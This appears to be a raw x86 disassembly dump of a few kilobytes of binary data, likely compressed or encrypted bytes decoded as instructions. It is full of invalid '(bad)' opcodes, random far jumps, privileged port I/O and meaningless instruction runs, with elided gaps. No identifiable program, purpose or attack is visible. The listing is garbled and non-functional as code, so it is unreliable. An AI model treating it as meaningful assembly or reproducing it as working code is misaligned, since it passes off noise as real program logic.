  41f303:	jo     0x41f339
  41f305:	dec    esp
  41f306:	add    DWORD PTR [eax],eax
  41f308:	add    eax,0xbc000001
  41f30d:	mov    al,0x5d
  41f30f:	test   DWORD PTR [eax+0x11c00276],0xe9cf57f6
  41f319:	xchg   ebp,eax
  41f31a:	add    ecx,DWORD PTR [eax-0x30]
  41f31d:	(bad)  
  41f31e:	pushf  
  41f31f:	cmp    ecx,ebp
  41f321:	push   ecx
  41f322:	xor    ebp,DWORD PTR [ebx+0x10378e66]
  41f328:	std    
  41f329:	aad    0xe4
  41f32b:	rcl    BYTE PTR [ecx],cl
  41f32d:	xor    dl,dl
  41f32f:	jo     0x41f2e8
  41f331:	mov    ch,0x7d
  41f333:	and    al,cl
  41f335:	xchg   DWORD PTR [ebx+0x4f],edi
  41f338:	jg     0x41f2d2
  41f33a:	in     al,0xb3
  41f33c:	mov    bh,0x3f
  41f33e:	sbb    eax,0x1d11ed1d
  41f343:	rcl    BYTE PTR [ecx-0x76db0e],cl
  41f349:	outs   dx,DWORD PTR ds:[esi]
  41f34a:	xchg   ebx,eax
  41f34b:	sbb    al,0x24
  41f34d:	cmc    
  41f34e:	jb     0x41f3aa
  41f350:	test   BYTE PTR [edx],bl
  41f352:	in     al,dx
  41f353:	mov    ebx,0xb33bf3b1
  41f358:	out    dx,al
  41f359:	jbe    0x41f37f
  41f35b:	pop    ecx
  41f35c:	jg     0x41f398
  41f35e:	popf   
  41f35f:	outs   dx,BYTE PTR ds:[esi]
  41f360:	inc    ebp
  41f361:	sub    al,0xe8
  41f363:	scas   al,BYTE PTR es:[edi]
  41f364:	fild   WORD PTR [edi]
  41f366:	add    esp,DWORD PTR [esi]
  41f368:	ret    0xf87f
  41f36b:	xchg   edx,eax
  41f36c:	pop    ds
  41f36d:	in     eax,dx
  41f36e:	rcl    DWORD PTR [ebx],cl
  41f370:	fs jno 0x41f3a8
  41f373:	out    dx,al
  41f374:	punpckldq mm6,DWORD PTR [edi-0x6776d975]
  41f37b:	mov    al,ds:0x61ecd67c
  41f380:	aam    0xfd
  41f382:	sub    ebx,ebx
  41f384:	dec    eax
  41f385:	cmc    
  41f386:	int3   
  41f387:	mov    bl,0x41
  41f389:	xor    dh,BYTE PTR [eax]
  41f38b:	fs mov bh,0x49
  41f38e:	pop    ecx
  41f38f:	cmc    
  41f390:	pop    ebx
  41f391:	fidiv  WORD PTR [ebx+0x16]
  41f394:	std    
  41f395:	xchg   edx,eax
  41f396:	es fdivr st(2),st
  41f399:	xlat   BYTE PTR ds:[ebx]
  41f39a:	mov    ebx,0x30562b3c
  41f39f:	dec    ecx
  41f3a0:	gs inc ecx
  41f3a2:	fisttp WORD PTR [edx+ebp*4-0x5]
  41f3a6:	push   esi
  41f3a7:	adc    DWORD PTR [ebp-0x78c5d76a],esi
  41f3ad:	ins    DWORD PTR es:[edi],dx
  41f3ae:	adc    ecx,ebx
  41f3b0:	sub    eax,DWORD PTR fs:[edx+0x5dfa6f40]
  41f3b7:	mov    ch,0x7f
  41f3b9:	cld    
  41f3ba:	call   0x53218d36
  41f3bf:	adc    dl,BYTE PTR [edi+0xf]
  41f3c2:	push   ebx
  41f3c3:	push   esp
  41f3c4:	or     DWORD PTR [ebp-0x3d79a6a6],edx
  41f3ca:	sub    DWORD PTR [edx+edi*2],eax
  41f3cd:	loopne 0x41f3d8
  41f3cf:	jns    0x41f446
  41f3d1:	nop
  41f3d2:	xchg   DWORD PTR [ebx-0x7a94f266],esi
  41f3d8:	mov    BYTE PTR [ebx],0xfd
  41f3db:	jle    0x41f44b
  41f3dd:	(bad)  
  41f3de:	xor    eax,0xb8f2189d
  41f3e3:	fs sti 
  41f3e5:	mov    ds:0xaf479893,al
  41f3ea:	jne    0x41f43b
  41f3ec:	fs dec ecx
  41f3ee:	outs   dx,BYTE PTR ds:[esi]
  41f3ef:	fist   WORD PTR [edi-0x67]
  41f3f2:	nop
  41f3f3:	pop    ss
  41f3f4:	xor    DWORD PTR [esi],eax
  41f3f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3f7:	imul   eax,DWORD PTR [edx+0x707efd3b],0xffffffaf
  41f3fe:	adc    ah,ch
  41f400:	cs into 
  41f402:	sub    ebx,DWORD PTR [ebp+0x7aefa08e]
  41f408:	lods   eax,DWORD PTR ds:[esi]
  41f409:	icebp  
  41f40a:	dec    edx
  41f40b:	cdq    
  41f40c:	and    ebp,DWORD PTR [esi+0x893271]
	...
  41f472:	add    BYTE PTR [eax],al
  41f474:	cmp    al,0xe7
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xe
  41f481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f482:	stc    
  41f483:	sub    edi,DWORD PTR [ecx]
  41f485:	dec    ebp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    eax,0xdd000001
  41f48d:	retf   0x3212
  41f490:	adc    BYTE PTR [ebx+0x12],bl
  41f493:	add    al,0xbd
  41f495:	push   ebp
  41f496:	pop    es
  41f497:	push   esp
  41f498:	sbb    bh,BYTE PTR [eax-0x18]
  41f49b:	xchg   esi,eax
  41f49c:	jmp    0xaa67:0x8cad4619
  41f4a3:	scas   eax,DWORD PTR es:[edi]
  41f4a4:	dec    eax
  41f4a5:	sbb    dh,ch
  41f4a7:	ss aad 0xb5
  41f4aa:	cwde   
  41f4ab:	adc    al,0x70
  41f4ad:	cmp    BYTE PTR [edi+0x78282ff6],cl
  41f4b3:	repz mov al,ds:0x22f3530a
  41f4b9:	pop    ecx
  41f4ba:	add    dh,BYTE PTR [edi-0x3337c511]
  41f4c0:	fmul   DWORD PTR [esi+0xb]
  41f4c3:	jle    0x41f46a
  41f4c5:	ins    DWORD PTR es:[edi],dx
  41f4c6:	jp     0x41f450
  41f4c8:	ja     0x41f45b
  41f4ca:	inc    ebx
  41f4cb:	sub    eax,0x7bfe1f3d
  41f4d0:	(bad)  
  41f4d1:	scas   al,BYTE PTR es:[edi]
  41f4d2:	cmp    al,0x89
  41f4d4:	mov    ebx,0x264ef487
  41f4d9:	or     al,0x72
  41f4db:	ds repz inc eax
  41f4de:	not    DWORD PTR [edx+0x35]
  41f4e1:	push   esp
  41f4e2:	jecxz  0x41f4cd
  41f4e4:	loopne 0x41f4dd
  41f4e6:	cmp    dl,BYTE PTR fs:[ebx+edx*8+0x3ff78150]
  41f4ee:	addr16 cdq 
  41f4f0:	cwde   
  41f4f1:	pusha  
  41f4f2:	sub    esp,DWORD PTR [ebx-0x1707e198]
  41f4f8:	push   0x2193a8e0
  41f4fd:	pop    ss
  41f4fe:	sahf   
  41f4ff:	mov    edi,ebp
  41f501:	mov    ebp,0xae99fda7
  41f506:	jmp    0x6a9d:0xe95275f6
  41f50d:	clc    
  41f50e:	mov    ch,0x94
  41f510:	xchg   esi,eax
  41f511:	fistp  QWORD PTR [ebx+0x211c1801]
  41f517:	xor    al,0x62
  41f519:	adc    edx,DWORD PTR [ebx-0x441bef68]
  41f51f:	push   eax
  41f520:	sbb    BYTE PTR [esi],bh
  41f522:	jg     0x41f530
  41f524:	cmp    BYTE PTR [esi-0xa],ah
  41f527:	adc    DWORD PTR [edi],esi
  41f529:	push   eax
  41f52a:	icebp  
  41f52b:	adc    edi,DWORD PTR [edi-0x4fc2b530]
  41f531:	fldln2 
  41f533:	addr16 cmp eax,0x373a3175
  41f539:	add    eax,0x7287a003
  41f53e:	es and al,0x96
  41f541:	out    0x10,al
  41f543:	rol    WORD PTR [edx],0x3f
  41f547:	(bad)  
  41f548:	sbb    BYTE PTR [ebp-0x6791296f],ch
  41f54e:	lahf   
  41f54f:	mov    edi,0xca21394f
  41f554:	pusha  
  41f555:	xor    BYTE PTR [edi+0xe],0x4d
  41f559:	mov    ch,0xc9
  41f55b:	mov    ebp,0xb6c91b25
  41f560:	cmp    eax,0xc4b6213f
  41f565:	cmp    al,0x77
  41f567:	pusha  
  41f568:	jno    0x41f4f3
  41f56a:	ja     0x41f4ed
  41f56c:	stos   BYTE PTR es:[edi],al
  41f56d:	lds    eax,FWORD PTR [ebp-0xf01c0f]
  41f573:	dec    edi
  41f574:	cdq    
  41f575:	push   esi
  41f576:	pop    ebp
  41f577:	xchg   edi,eax
  41f578:	push   ecx
  41f579:	sbb    al,BYTE PTR [ebp-0x7f72efb1]
  41f57f:	loope  0x41f594
  41f581:	or     BYTE PTR [ebx],ah
  41f583:	pop    esi
  41f584:	jo     0x41f52b
  41f586:	cwde   
  41f587:	cmp    eax,0x6018a581
  41f58c:	inc    dl
  41f58e:	shl    DWORD PTR [ecx],1
  41f590:	enter  0x0,0x0
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x3e9d:0xba9ad422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0xdd000001
  41f60d:	dec    eax
  41f60e:	sbb    esi,DWORD PTR [ebx+0x73]
  41f611:	xor    edx,DWORD PTR [ebx+0x11a232c1]
  41f617:	fadd   QWORD PTR [esi+0x69585eaf]
  41f61d:	pop    ebx
  41f61e:	int    0x63
  41f620:	or     DWORD PTR [edx],eax
  41f622:	sub    al,0x51
  41f624:	add    al,0xcb
  41f626:	fild   DWORD PTR [eax-0x34ac23dc]
  41f62c:	push   ebx
  41f62d:	(bad)  
  41f62e:	fsubr  st(6),st
  41f630:	retf   
  41f631:	jmp    0x64c6cebd
  41f636:	mov    esi,0x3fb1e25f
  41f63b:	inc    eax
  41f63c:	loope  0x41f5d2
  41f63e:	js     0x41f64d
  41f640:	loope  0x41f681
  41f642:	cld    
  41f643:	xchg   esp,eax
  41f644:	pop    ebp
  41f645:	xor    dl,bh
  41f647:	mov    bl,0x90
  41f649:	adc    eax,0xd3f0035b
  41f64e:	retf   
  41f64f:	pushf  
  41f650:	xor    eax,DWORD PTR [edx+0xa]
  41f653:	fwait
  41f654:	inc    ecx
  41f655:	lea    eax,[eax+0x6e9aa358]
  41f65b:	loop   0x41f668
  41f65d:	cdq    
  41f65e:	popa   
  41f65f:	cdq    
  41f660:	adc    DWORD PTR [ecx-0x128a187a],edx
  41f666:	repz (bad) 
  41f668:	(bad)  [edi]
  41f66a:	lds    ebp,FWORD PTR [ebx+0x21]
  41f66d:	shl    BYTE PTR [edi+0x121c9ada],cl
  41f673:	mov    edx,0x1c807901
  41f678:	mov    bh,0xbf
  41f67a:	in     eax,dx
  41f67b:	dec    esp
  41f67c:	or     esp,DWORD PTR [esi]
  41f67e:	ja     0x41f6d1
  41f680:	scas   al,BYTE PTR es:[edi]
  41f681:	loope  0x41f669
  41f683:	xor    eax,0x9f06a9a4
  41f688:	stos   DWORD PTR es:[edi],eax
  41f689:	frstor [ebp+0x4d]
  41f68c:	or     esp,DWORD PTR [esi+0x33]
  41f68f:	mov    esi,0x9d551078
  41f694:	out    dx,al
  41f695:	ins    DWORD PTR es:[edi],dx
  41f696:	ss pop ss
  41f698:	inc    esp
  41f699:	jle    0x41f674
  41f69b:	mov    eax,0x8088adcb
  41f6a0:	xchg   edi,eax
  41f6a1:	lds    edx,FWORD PTR [eax+0x72e9c92a]
  41f6a7:	std    
  41f6a8:	or     eax,0xa2aaa7fe
  41f6ad:	(bad)  
  41f6ae:	data16 cmp bl,BYTE PTR [edi+edx*8-0x588beefe]
  41f6b6:	cs mov cl,0xd7
  41f6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6ba:	nop
  41f6bb:	leave  
  41f6bc:	sahf   
  41f6bd:	cs add al,0x6
  41f6c0:	inc    ebp
  41f6c1:	pop    eax
  41f6c2:	fdiv   QWORD PTR [eax]
  41f6c4:	push   eax
  41f6c5:	(bad)  
  41f6c6:	popa   
  41f6c7:	mov    ebx,0x39283edf
  41f6cc:	or     eax,0x3190c64d
  41f6d1:	int3   
  41f6d2:	loop   0x41f6e7
  41f6d4:	test   eax,0x5ed45c5e
  41f6d9:	cmp    edi,esi
  41f6db:	jae    0x41f72e
  41f6dd:	je     0x41f6b3
  41f6df:	shl    DWORD PTR [esi-0x55197d01],0xd3
  41f6e6:	adc    eax,0x8d47704
  41f6eb:	lahf   
  41f6ec:	in     eax,0x6e
  41f6ee:	adc    BYTE PTR [edx+0x3b],dl
  41f6f1:	jle    0x41f71f
  41f6f3:	inc    ebx
  41f6f4:	nop
  41f6f5:	sti    
  41f6f6:	std    
  41f6f7:	loop   0x41f6d0
  41f6f9:	leave  
  41f6fa:	mov    WORD PTR [esi-0x5e203c11],gs
  41f700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f701:	push   0x10
  41f703:	xchg   DWORD PTR [esi],esi
  41f705:	cmp    DWORD PTR [ebx],ebx
  41f707:	jnp    0x41f6a9
  41f709:	cmp    edx,ebp
  41f70b:	xchg   ecx,eax
  41f70c:	int3   
  41f70d:	inc    ebx
  41f70e:	jne    0x41f70a
  41f710:	mov    BYTE PTR [eax],0x0
	...
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x5af9:0xc26c62d2
  41f783:	retf   0x4f43
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0xc4000001
  41f78d:	test   BYTE PTR [edx],bh
  41f78f:	cdq    
  41f790:	inc    edx
  41f791:	shl    DWORD PTR [edx+0x68efbb16],1
  41f797:	push   ds
  41f798:	adc    bl,bh
  41f79a:	in     al,dx
  41f79b:	loop   0x41f7cc
  41f79d:	cmp    al,0x8c
  41f79f:	lods   al,BYTE PTR ds:[esi]
  41f7a0:	inc    ebx
  41f7a1:	pop    esi
  41f7a2:	mov    dh,0x5f
  41f7a4:	add    al,0x9b
  41f7a6:	test   DWORD PTR [edx+0x45],edx
  41f7a9:	es gs setle al
  41f7ae:	xchg   esp,eax
  41f7af:	(bad)  
  41f7b0:	xchg   ebp,eax
  41f7b1:	pop    ds
  41f7b2:	in     eax,0x6f
  41f7b4:	dec    ecx
  41f7b5:	retf   
  41f7b6:	es pop esi
  41f7b8:	inc    esi
  41f7b9:	jne    0x41f74b
  41f7bb:	cmp    eax,0x47ab6452
  41f7c0:	mov    dh,0x35
  41f7c2:	dec    eax
  41f7c3:	jb     0x41f7c5
  41f7c5:	xor    ah,BYTE PTR [esp+ecx*8-0x771d4c3a]
  41f7cc:	dec    edx
  41f7cd:	outs   dx,BYTE PTR ds:[esi]
  41f7ce:	adc    eax,0x422812a5
  41f7d3:	sbb    DWORD PTR [ecx],edx
  41f7d5:	and    DWORD PTR [ebx+0x2e09b849],ebp
  41f7db:	stos   DWORD PTR es:[edi],eax
  41f7dc:	mov    al,0x7d
  41f7de:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f7e0:	stos   DWORD PTR es:[edi],eax
  41f7e1:	jnp    0x41f823
  41f7e3:	pop    esp
  41f7e4:	call   0xdb9e75ea
  41f7e9:	mov    ah,0x0
  41f7eb:	imul   ecx,DWORD PTR [ecx-0x1df76933],0xffffff92
  41f7f2:	push   0x7b
  41f7f4:	push   esp
  41f7f5:	add    al,al
  41f7f7:	loopne 0x41f830
  41f7f9:	push   esi
  41f7fa:	out    0x76,al
  41f7fc:	inc    esi
  41f7fd:	mov    ds:0xd5ef7313,al
  41f802:	cli    
  41f803:	imul   DWORD PTR [ebx-0x50fbea74]
  41f809:	es lahf 
  41f80b:	adc    DWORD PTR [ebx+0x438545e1],ebp
  41f811:	rcr    BYTE PTR [ebx+0x2],cl
  41f814:	push   eax
  41f815:	loope  0x41f79b
  41f817:	and    ebx,esp
  41f819:	stos   DWORD PTR es:[edi],eax
  41f81a:	xchg   DWORD PTR [ebp+0x14d7ea37],ebp
  41f820:	mov    fs,edi
  41f822:	addr16 xchg edi,eax
  41f824:	or     bl,BYTE PTR [edi]
  41f826:	data16 int3 
  41f828:	cwde   
  41f829:	loope  0x41f827
  41f82b:	mov    cl,0xae
  41f82d:	or     eax,0x5f26155d
  41f832:	loope  0x41f847
  41f834:	lock out 0xa9,al
  41f837:	push   esi
  41f838:	sbb    edx,esp
  41f83a:	ja     0x41f803
  41f83c:	mov    bl,0xcd
  41f83e:	(bad)  
  41f83f:	shl    DWORD PTR [edx+0x72725258],cl
  41f845:	pushf  
  41f846:	scas   eax,DWORD PTR es:[edi]
  41f847:	mov    cl,ch
  41f849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f84a:	mov    al,0xb3
  41f84c:	and    BYTE PTR [ebx+eax*1+0x5f],bl
  41f850:	pop    ebp
  41f851:	push   0x6205c086
  41f856:	aad    0xa3
  41f858:	cmp    al,0xae
  41f85a:	pop    ebp
  41f85b:	sub    DWORD PTR es:[edx+edx*2-0x7c],0xffffffbe
  41f861:	mov    esp,0x254499e3
  41f866:	dec    edx
  41f867:	or     BYTE PTR [esi+0x45],bl
  41f86a:	dec    edx
  41f86b:	xchg   ecx,eax
  41f86c:	out    dx,al
  41f86d:	push   ebp
  41f86e:	in     al,dx
  41f86f:	jno    0x41f8c0
  41f871:	push   ss
  41f872:	mov    edi,0x5ab24547
  41f877:	call   0xa3e67de1
  41f87c:	push   ds
  41f87d:	arpl   WORD PTR [ebx],sp
  41f87f:	mov    esi,0x91b7bdd2
  41f884:	add    ch,BYTE PTR [ebx]
  41f886:	xlat   BYTE PTR ds:[ebx]
  41f887:	xchg   BYTE PTR [edx-0x629050a0],al
  41f88d:	add    BYTE PTR [edi+0xadf1],ch
	...
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f902:	clc    
  41f903:	and    DWORD PTR [eax+0x50],ecx
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0xe000001
  41f90d:	pop    eax
  41f90e:	xchg   ebx,eax
  41f90f:	adc    bl,BYTE PTR [ebx+0x8c45baa]
  41f915:	js     0x41f979
  41f917:	fidivr WORD PTR [edi+0x754acf06]
  41f91d:	inc    esi
  41f91e:	test   BYTE PTR [ebx-0x637ad8ae],cl
  41f924:	std    
  41f925:	loopne 0x41f974
  41f927:	retf   
  41f928:	xchg   ebp,eax
  41f929:	sbb    DWORD PTR [eax+esi*2-0x14e8b469],edi
  41f930:	imul   esi,DWORD PTR [edi],0xffffffae
  41f933:	xchg   ebx,eax
  41f934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f935:	xchg   edi,eax
  41f936:	sti    
  41f937:	dec    eax
  41f938:	pop    ss
  41f939:	jge    0x41f93a
  41f93b:	cmp    esp,ebx
  41f93d:	aad    0xc2
  41f93f:	inc    eax
  41f940:	test   al,0xd8
  41f942:	fwait
  41f943:	xchg   edx,eax
  41f944:	shr    esi,0xf9
  41f947:	push   esi
  41f948:	daa    
  41f949:	dec    esp
  41f94a:	inc    eax
  41f94b:	add    BYTE PTR [eax],dh
  41f94d:	push   esp
  41f94e:	and    esi,edx
  41f950:	pop    ebp
  41f951:	scas   al,BYTE PTR es:[edi]
  41f952:	icebp  
  41f953:	adc    eax,0x6423ff49
  41f958:	xor    BYTE PTR [ebx+0x2d],al
  41f95b:	and    ebx,DWORD PTR [eax]
  41f95d:	inc    edx
  41f95e:	mov    esi,0x77e035d6
  41f963:	stc    
  41f964:	or     DWORD PTR [esi+0x7dfb41f4],eax
  41f96a:	push   esp
  41f96b:	fild   WORD PTR [ecx]
  41f96d:	les    esi,FWORD PTR [edx-0x74]
  41f970:	mov    edi,0x6fafe37d
  41f975:	fdivr  QWORD PTR [ebx+0x43]
  41f978:	pop    ss
  41f979:	and    DWORD PTR [eax-0x3b],esi
  41f97c:	data16 fidiv DWORD PTR [eax+esi*1-0x404772e2]
  41f984:	sbb    DWORD PTR [ebx],edx
  41f986:	mov    DWORD PTR [eax],0x3bc49a92
  41f98c:	dec    edx
  41f98d:	xor    al,0xc6
  41f98f:	sahf   
  41f990:	jb     0x41f961
  41f992:	add    ecx,esi
  41f994:	daa    
  41f995:	sub    ecx,DWORD PTR [eax+0x7431a820]
  41f99b:	push   cs
  41f99c:	fucomp st(7)
  41f99e:	scas   eax,DWORD PTR es:[edi]
  41f99f:	ins    BYTE PTR es:[edi],dx
  41f9a0:	in     al,dx
  41f9a1:	inc    edx
  41f9a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9a3:	cli    
  41f9a4:	(bad)  
  41f9a5:	stc    
  41f9a6:	fsubr  st,st(5)
  41f9a8:	xor    eax,0x582262e5
  41f9ad:	mov    dl,0x5d
  41f9af:	adc    DWORD PTR [edx-0x3fbe8ee3],edi
  41f9b5:	bound  ecx,QWORD PTR fs:[eax-0x3a48efe1]
  41f9bc:	mov    esp,0x92f3d7a5
  41f9c1:	inc    esp
  41f9c2:	jnp    0x41f9ba
  41f9c4:	xor    eax,0xbaf1669e
  41f9c9:	dec    edx
  41f9ca:	dec    ecx
  41f9cb:	lahf   
  41f9cc:	xor    al,0x35
  41f9ce:	or     al,0xa1
  41f9d0:	mov    edi,0x5052ad1a
  41f9d5:	loop   0x41f9a2
  41f9d7:	into   
  41f9d8:	into   
  41f9d9:	bound  edi,QWORD PTR [eax]
  41f9db:	es pop es
  41f9dd:	fucomip st,st(7)
  41f9df:	mov    ecx,0xeda56f53
  41f9e4:	aaa    
  41f9e5:	sbb    DWORD PTR [eax+0x4dcde225],0x84987a53
  41f9ef:	mov    al,0xd0
  41f9f1:	ja     0x41f973
  41f9f3:	call   0xdb13:0x8efbd51d
  41f9fa:	loope  0x41f9da
  41f9fc:	jp     0x41fa30
  41f9fe:	inc    eax
  41f9ff:	xchg   ebp,eax
  41fa00:	jge    0x41fa29
  41fa02:	shr    BYTE PTR [ebp+0x7f],0x7c
  41fa06:	inc    edx
  41fa07:	in     eax,dx
  41fa08:	push   ecx
  41fa09:	ret    
  41fa0a:	or     al,0xa8
  41fa0c:	addr16 test eax,0x40305f
	...
  41fa72:	add    BYTE PTR [eax],al
  41fa74:	or     al,BYTE PTR [ecx-0x49]
  41fa77:	mov    eax,ds:0xeb1ef7ff
  41fa7c:	and    edx,DWORD PTR [edi-0x5d]
  41fa7f:	adc    eax,0x13136cb9
  41fa84:	dec    ebp
  41fa85:	push   ecx
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    eax,0x80000001
  41fa8d:	adc    DWORD PTR [edi+0xc570a34],edx
  41fa93:	xchg   edi,eax
  41fa94:	mov    esp,0xcd3de027
  41fa99:	mov    cl,0xa9
  41fa9b:	jbe    0x41fa54
  41fa9d:	retf   0xac5c
  41faa0:	repz and BYTE PTR [ecx],cl
  41faa3:	test   BYTE PTR [edi+0x2],cl
  41faa6:	sub    eax,0xa6979679
  41faab:	mov    eax,0x476e9ad1
  41fab0:	jmp    0x20c9:0xad7d4429
  41fab7:	adc    ch,bh
  41fab9:	dec    ebx
  41faba:	cmp    dh,BYTE PTR [eax+0xe]
  41fabd:	pop    edx
  41fabe:	sub    al,0x88
  41fac0:	(bad)  
  41fac2:	sub    al,0xa5
  41fac4:	aad    0x85
  41fac6:	pusha  
  41fac7:	pop    es
  41fac8:	sub    eax,0x3bd02ede
  41facd:	pop    ds
  41face:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41facf:	inc    edx
  41fad0:	mov    ds:0x3aff6da0,al
  41fad5:	xchg   edi,eax
  41fad6:	xor    DWORD PTR [edx+0x27],esp
  41fad9:	cmp    ecx,DWORD PTR [edx-0x2948759e]
  41fadf:	push   ss
  41fae0:	inc    ecx
  41fae1:	fistp  QWORD PTR [ecx+0xdb7cd3d]
  41fae7:	push   esi
  41fae8:	xchg   ebp,eax
  41fae9:	data16 outs dx,BYTE PTR ds:[esi]
  41faeb:	shr    DWORD PTR [ebp+0x6715aac9],cl
  41faf1:	fcomip st,st(0)
  41faf3:	and    al,0x61
  41faf5:	repz aam 0xd6
  41faf8:	cmp    DWORD PTR [ecx-0x29671936],0x3e823702
  41fb02:	out    dx,eax
  41fb03:	dec    ebx
  41fb04:	sub    ebx,esi
  41fb06:	inc    ecx
  41fb07:	mov    esp,eax
  41fb09:	aam    0x42
  41fb0b:	jg     0x41fb2c
  41fb0d:	mov    bl,0x22
  41fb0f:	lds    ebp,FWORD PTR [ebx-0x75e3bf88]
  41fb15:	js     0x41fb72
  41fb17:	aad    0x11
  41fb19:	push   es
  41fb1a:	add    al,bh
  41fb1c:	mov    esi,0xcee0b1d8
  41fb22:	addr16 cmp dh,al
  41fb25:	rep ins BYTE PTR es:[edi],dx
  41fb27:	mov    dl,0x65
  41fb29:	mov    ecx,0x6aa5c69d
  41fb2e:	pop    ebp
  41fb2f:	gs repz mov cl,0xa8
  41fb33:	pushf  
  41fb34:	pop    esi
  41fb35:	sub    ecx,DWORD PTR [ecx+0x8]
  41fb38:	pop    es
  41fb39:	mov    edi,0xc12b7844
  41fb3e:	adc    esi,DWORD PTR [eax+0x452d1c67]
  41fb44:	in     al,0xc
  41fb46:	pop    ds
  41fb47:	push   ds
  41fb48:	icebp  
  41fb49:	outs   dx,DWORD PTR ds:[esi]
  41fb4a:	xchg   esi,eax
  41fb4b:	das    
  41fb4c:	dec    ebp
  41fb4d:	and    eax,0x6cb4deea
  41fb52:	enter  0x66e8,0x82
  41fb56:	sahf   
  41fb57:	inc    BYTE PTR [ebp+esi*2-0x2d]
  41fb5b:	sub    DWORD PTR [esi-0x55],ebp
  41fb5e:	je     0x41fb77
  41fb60:	iret   
  41fb61:	dec    ecx
  41fb62:	xchg   esp,eax
  41fb63:	iret   
  41fb64:	ror    BYTE PTR [ebx-0x57bdb4a2],0x95
  41fb6b:	adc    ch,dh
  41fb6d:	mov    bl,0xa4
  41fb6f:	outs   dx,BYTE PTR ds:[esi]
  41fb70:	(bad)  
  41fb71:	imul   edi,DWORD PTR [edi+0x1c8e798d],0x9484a8f6
  41fb7b:	popa   
  41fb7c:	and    dh,BYTE PTR [ebp-0x68]
  41fb7f:	je     0x41fbc2
  41fb81:	pop    ecx
  41fb82:	aad    0xd3
  41fb84:	push   cs
  41fb85:	mov    esi,0x5d90f22a
  41fb8a:	outs   dx,DWORD PTR ds:[esi]
  41fb8b:	jmp    0x41fb73
  41fb8d:	sub    ecx,DWORD PTR [edi+ecx*8]
  41fb90:	int3   
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	mov    eax,0x52c2ff35
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xbf000001
  41fc0d:	sub    BYTE PTR [ecx+0x17dd2992],ch
  41fc13:	and    al,0x81
  41fc15:	jo     0x41fbbf
  41fc17:	mov    edi,0x2da12a8d
  41fc1c:	aam    0x3b
  41fc1e:	stos   BYTE PTR es:[edi],al
  41fc1f:	js     0x41fbc1
  41fc21:	inc    edi
  41fc22:	dec    esp
  41fc23:	fisttp WORD PTR gs:[edx-0x7dbb30d0]
  41fc2a:	aaa    
  41fc2b:	adc    bh,bl
  41fc2d:	imul   edx,ebp,0x627de385
  41fc33:	nop
  41fc34:	or     eax,0xcdc41a24
  41fc39:	adc    ch,al
  41fc3b:	dec    esp
  41fc3c:	mov    eax,DWORD PTR [edx-0xb]
  41fc3f:	add    al,0xab
  41fc41:	push   0x51325d97
  41fc46:	gs sti 
  41fc48:	mov    al,0xa7
  41fc4a:	push   ss
  41fc4b:	(bad)  
  41fc4c:	xchg   ebp,eax
  41fc4d:	add    DWORD PTR [ebx+edi*4],esp
  41fc50:	ret    
  41fc51:	int    0x0
  41fc53:	popf   
  41fc54:	mov    ebx,0xd59ca72
  41fc59:	push   cs
  41fc5a:	in     eax,dx
  41fc5b:	(bad)  
  41fc5c:	jg     0x41fbf5
  41fc5e:	xchg   esi,eax
  41fc5f:	xchg   DWORD PTR [esi],ebx
  41fc61:	jg     0x41fcb4
  41fc63:	(bad)  [ebx]
  41fc65:	cld    
  41fc66:	jnp    0x41fbec
  41fc68:	sbb    eax,0xdb2493b
  41fc6d:	sub    edi,0xffffff99
  41fc70:	pusha  
  41fc71:	mov    ebp,0x7ecd94dd
  41fc76:	mov    al,ds:0x3a681762
  41fc7b:	mov    DWORD PTR [ecx],esi
  41fc7d:	popa   
  41fc7e:	dec    ebp
  41fc7f:	ins    DWORD PTR es:[edi],dx
  41fc80:	les    edi,FWORD PTR [eax+0x782307a0]
  41fc86:	xchg   esi,eax
  41fc87:	pop    eax
  41fc88:	loope  0x41fc33
  41fc8a:	mov    bl,0x3f
  41fc8c:	push   ds
  41fc8d:	adc    eax,0xb28dbbea
  41fc92:	jo     0x41fcf5
  41fc94:	jl     0x41fced
  41fc96:	or     DWORD PTR [esi+0x6f9bc822],esp
  41fc9c:	jmp    0x1f1b:0x1054ef43
  41fca3:	nop
  41fca4:	aam    0x10
  41fca6:	dec    ecx
  41fca7:	fwait
  41fca8:	mov    ecx,0x175aaa6
  41fcad:	or     BYTE PTR [eax],cl
  41fcaf:	cmp    bh,dh
  41fcb1:	sbb    ch,BYTE PTR [ecx]
  41fcb3:	or     eax,DWORD PTR [ecx+ecx*4]
  41fcb6:	add    edi,ebp
  41fcb8:	push   edi
  41fcb9:	inc    esi
  41fcba:	pop    es
